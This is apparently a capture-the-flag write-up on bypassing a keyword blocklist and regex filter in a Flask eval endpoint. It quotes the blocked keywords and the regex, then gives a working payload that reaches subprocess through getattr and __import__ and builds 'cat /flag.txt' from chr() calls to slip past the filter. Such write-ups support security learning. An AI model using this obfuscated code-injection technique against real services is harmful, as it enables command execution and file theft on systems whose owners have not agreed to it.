# 1. Analysis
![](Pasted%20image%2020250522092228.png)

interesting comments
```

TODO
------------
Secure python_flask eval execution by 

1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind

2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'

```

if we input malicious keyword, the server will banned
![](Pasted%20image%2020250522101257.png)

base on that comment, we have to craft a payload that bypassed that rules

lets use chatgpt to get explanation of that regex
![](Pasted%20image%2020250522104243.png)
example
![](Pasted%20image%2020250522104347.png)

It means we need to use functions other than `os`, `eval`, `exec`, `bind`, `connect`, `python`, `socket`, `ls`, `cat`, and `shell`, and we should also use obfuscation techniques not covered by the patterns in that regex.
# 2. Exploitation
after surf on the internet, i found alternative function like
```
import(‘subprocess’)
check_output() using getattr()
obfuscate using chr()
```

this is the final payload
```
from this..
getattr(__import__('subprocess'), 'check_output')(['cat', '/flag.txt']) 


to be..
getattr(__import__('subprocess'), 'check_output')([chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)])
```

![](Pasted%20image%2020250522103734.png)
# 3. Conclussion
Hurray! You solved this challenge.

Knowledge need to know:
- Obfuscation
- Flask alternative function

